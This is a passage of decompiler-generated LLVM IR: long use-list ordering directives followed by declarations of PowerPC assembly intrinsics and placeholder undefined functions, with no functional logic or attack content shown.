893, 894, 27, 1145, 1362, 331, 1365, 67, 332, 254, 1366, 333, 1369, 1370, 65, 66, 1371, 1363, 1364, 334, 335, 1159, 1152, 336, 68, 1153, 1154, 1155, 41, 1157, 1158, 1182, 1183, 1203, 1204, 1205, 1206, 255, 241, 242, 338, 1207, 1208, 1209, 1211, 192, 1214, 339, 256, 1216, 1217, 1218, 1219, 337, 257, 1213, 1210, 1212, 1215, 1220, 245, 1221, 1222, 1223, 1, 1290, 1291, 1292, 143, 142, 1293, 2, 144, 258, 855, 856, 857, 3, 895, 896, 194, 898, 897, 57, 4, 899, 193, 5, 900, 196, 901, 58, 6, 902, 195, 1224, 1225, 69, 1226, 1227, 1228, 1229, 1230, 1160, 1161, 1176, 340, 1177, 1178, 1179, 903, 904, 905, 906, 907, 341, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 145, 146, 921, 922, 923, 924, 925, 926, 927, 928, 929, 42, 930, 342, 93, 931, 932, 933, 934, 935, 147, 936, 937, 938, 939, 940, 941, 942, 943, 1276, 1277, 148, 1278, 1279, 1280, 313, 314, 1281, 1282, 1283, 28, 7, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 99, 1372, 1373, 1374, 1377, 1375, 8, 197, 964, 963, 198, 962, 100, 965, 966, 967, 149, 968, 1301, 1315, 1316, 259, 1317, 870, 1378, 1379, 1380, 1381, 1382, 1318, 343, 344, 345, 1398, 1399, 346, 1404, 1424, 199, 1425, 347, 348, 1416, 9, 1383, 1384, 260, 150, 749, 750, 349, 261, 350, 751, 752, 72, 73, 753, 754, 755, 351, 756, 757, 758, 70, 71, 759, 760, 1385, 1386, 1387, 1388, 1389, 1390, 151, 352, 1397, 813, 814, 815, 816, 817, 152, 818, 819, 820, 315, 821, 353, 822, 354, 740, 741, 742, 153, 743, 154, 1063, 1064, 200, 101, 125, 1065, 1066, 10, 1251, 744, 745, 155, 746, 747, 748, 1321, 1323, 43, 1324, 74, 1325, 1322, 1319, 1320, 11, 765, 761, 762, 763, 764, 201, 12, 1328, 1326, 1327, 202, 1329, 1330, 766, 767, 768, 769, 770, 355, 771, 772, 1331, 1332, 356, 1333, 156, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 13, 14, 712, 773, 774, 775, 75, 76, 776, 15, 357, 316, 317, 358, 1231, 1232, 203, 1233, 1234, 1235, 1236, 1242, 1243, 1244, 1245, 157, 1246, 1247, 1294, 1285, 1284, 262, 359, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 360, 1413, 16, 17, 1271, 158, 159, 969, 970, 29, 30, 263, 31, 971, 204, 18, 1252, 1253, 1254, 77, 972, 973, 205, 361, 974, 1237, 1238, 1239, 1240, 1241, 1354, 1355, 206, 1156, 19, 92, 1118, 207, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1417, 1418, 1419, 78, 1420, 1421, 1422, 1423, 160, 975, 976, 977, 978, 979, 980, 161, 1180, 1162, 1163, 1164, 1165, 1166, 1173, 1169, 1170, 1171, 1172, 208, 1174, 1175, 1167, 20, 79, 1168, 777, 1181, 778, 779, 981, 982, 102, 983, 984, 985, 986, 987, 246, 988, 989, 990, 162, 991, 992, 993, 994, 995, 163, 996, 997, 998, 999, 1000, 1001, 1002, 164, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 44, 181, 182, 209, 1014, 1015, 165, 1016, 362, 1017, 1018, 363, 1021, 170, 166, 1019, 1020, 365, 1022, 1023, 1024, 1026, 171, 1027, 21, 22, 172, 173, 167, 168, 1028, 1029, 169, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 364, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 713, 1049, 1050, 32, 1052, 80, 103, 174, 366, 1055, 318, 1056, 1051, 1053, 1054, 1057, 1058, 175, 716, 717, 94, 59, 86, 1025, 210, 1392, 1394, 1393, 212, 176, 1396, 1395, 211, 264, 1184, 1185, 1186, 177, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 367, 1196, 1197, 1198, 1199, 1200, 1201, 247, 1059, 1060, 368, 1202, 1146, 1147, 1148, 1149, 1150, 1151, 1356, 1376, 369, 1067, 1367, 1368, 780, 1286, 1299, 781, 1305, 1400, 178, 1401, 1360, 1306, 1361, 782, 1307, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 1263, 1308, 1309, 793, 1391, 1402, 1403, 1414, 1415, 250, 371, 372, 213, 794, 375, 34, 35, 376, 795, 796, 384, 385, 409, 410, 33, 45, 248, 370, 714, 373, 249, 374, 797, 214, 104, 377, 798, 799, 800, 801, 803, 232, 802, 804, 805, 380, 381, 378, 379, 806, 382, 383, 267, 266, 265, 268, 215, 808, 386, 807, 389, 390, 387, 388, 809, 391, 810, 392, 811, 393, 812, 394, 46, 87, 105, 106, 107, 108, 109, 110, 111, 251, 398, 269, 179, 823, 824, 403, 825, 827, 397, 404, 826, 218, 828, 829, 830, 401, 831, 833, 396, 402, 832, 217, 834, 400, 835, 836, 837, 405, 838, 840, 395, 406, 839, 216, 841, 399, 842, 843, 844, 845, 846, 407, 847, 848, 849, 408, 850, 851, 852, 853, 112, 113, 412, 272, 273, 270, 413, 863, 411, 858, 859, 860, 861, 862, 219, 864, 865, 414, 319, 866, 271, 867, 868, 869, 114, 115, 116, 184, 417, 277, 276, 235, 233, 234, 418, 91, 320, 871, 419, 416, 275, 872, 183, 420, 274, 238, 236, 237, 421, 415, 873, 874, 875, 876, 180, 422, 1061, 221, 1062, 220, 185, 423, 278, 425, 426, 427, 424, 428, 429, 430, 431, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 1068, 47, 1069, 279, 432, 433, 434, 435, 436, 437, 438, 48, 186, 449, 450, 451, 452, 280, 281, 282, 1248, 321, 1249, 252, 1250, 81, 88, 89, 96, 95, 49, 50, 453, 283, 284, 285, 286, 1262, 1256, 1258, 1259, 1260, 455, 1261, 456, 288, 287, 454, 82, 1255, 1257, 51, 117, 223, 222, 23, 24, 715, 457, 1264, 289, 290, 291, 292, 1265, 1266, 293, 294, 458, 83, 1267, 118, 90, 1272, 224, 187, 1273, 295, 1268, 1269, 459, 460, 461, 1270, 322, 463, 1274, 297, 296, 462, 84, 464, 1275, 298, 1287, 239, 467, 1288, 301, 466, 85, 1289, 300, 465, 225, 299, 52, 188, 1295, 1296, 323, 1297, 1298, 119, 53, 324, 1300, 226, 1302, 468, 469, 470, 302, 1303, 1304, 303, 471, 1310, 1311, 472, 1312, 1313, 1314, 473, 120, 306, 304, 305, 474, 475, 1353, 121, 54, 240, 227, 309, 310, 1342, 1343, 1344, 1345, 228, 307, 308, 311, 1346, 1347, 1348, 230, 55, 122, 123, 229, 1350, 1351, 1352, 325, 124, 56, 1349, 1357, 1358, 312, 1434, 1435, 1436, 1359, 718, 719, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460 }
  uselistorder i32* @lr, { 11, 288, 289, 290, 291, 292, 293, 198, 530, 531, 532, 294, 298, 295, 296, 297, 302, 303, 299, 300, 301, 304, 305, 306, 307, 308, 12, 13, 14, 17, 15, 16, 309, 313, 310, 1, 312, 0, 314, 317, 318, 315, 316, 319, 320, 321, 322, 323, 324, 325, 326, 166, 199, 200, 327, 328, 329, 330, 201, 202, 203, 204, 507, 537, 538, 539, 540, 533, 534, 535, 536, 331, 336, 351, 337, 338, 339, 352, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 470, 167, 168, 169, 170, 205, 206, 207, 541, 208, 209, 340, 341, 346, 347, 348, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 542, 543, 222, 223, 508, 509, 552, 553, 557, 558, 559, 560, 561, 574, 576, 578, 554, 556, 180, 23, 24, 25, 26, 27, 28, 29, 544, 550, 551, 18, 19, 280, 21, 281, 20, 22, 510, 512, 511, 30, 31, 32, 33, 34, 35, 513, 514, 515, 516, 517, 518, 36, 481, 392, 393, 181, 519, 464, 440, 89, 441, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 407, 408, 409, 410, 471, 462, 562, 563, 564, 565, 566, 569, 570, 571, 453, 224, 225, 226, 428, 429, 430, 431, 227, 405, 406, 311, 577, 575, 228, 229, 230, 349, 342, 344, 345, 343, 37, 350, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 9, 10, 245, 545, 546, 547, 548, 549, 572, 573, 353, 354, 355, 356, 357, 358, 359, 360, 259, 260, 261, 332, 333, 334, 335, 473, 38, 490, 39, 40, 41, 42, 555, 491, 567, 568, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 171, 172, 173, 174, 175, 176, 177, 178, 179, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 265, 262, 263, 264, 2, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 3, 4, 5, 6, 7, 8, 282, 283, 284, 285, 286, 287, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 432, 433, 434, 435, 436, 454, 455, 456, 437, 438, 439, 442, 443, 444, 445, 446, 447, 448, 457, 449, 450, 451, 452, 458, 459, 460, 461, 463, 465, 466, 467, 468, 469, 472, 474, 475, 476, 477, 478, 479, 480, 482, 483, 484, 485, 486, 487, 488, 489, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 520, 521, 522, 523, 524, 525, 527, 526, 528, 529 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
